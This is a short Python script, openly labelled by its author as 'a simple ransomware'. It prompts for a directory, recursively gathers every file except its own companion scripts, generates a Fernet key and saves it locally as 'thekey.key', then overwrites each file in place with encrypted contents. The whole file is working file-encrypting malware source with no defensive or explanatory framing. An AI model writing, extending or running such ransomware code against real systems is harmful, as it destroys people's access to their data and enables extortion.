import os
from cryptography.fernet import Fernet

# creating a simple ransomware to encrypt files
# created by Youssef/dark-lime-0

def main()->None:
    files_to_enc=[]
    try:
        dir = input("specify a dir to encrypt : ")
        for root, dirs, files in os.walk(dir):
            for file in files :
                if file in ['enc_file.py', 'thekey.key', 'dec_file.py']:
                    continue
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path):
                    files_to_enc.append(file_path)

        key = Fernet.generate_key()
        with open("thekey.key", 'wb') as thekey:    # save the decryption key into a file
            thekey.write(key)

        for file in files_to_enc :                         # encrypt the files
            with open(file,'rb') as thefile:
                containts = thefile.read()
            enc_data = Fernet(key).encrypt(containts)
            with open(file, 'wb') as thefile :
                thefile.write(enc_data)

        print("Encryption Completed successfully !!")
    except Exception as e:
        print(f"Error: {e}. Please try again!")
if __name__=='__main__':
    main()



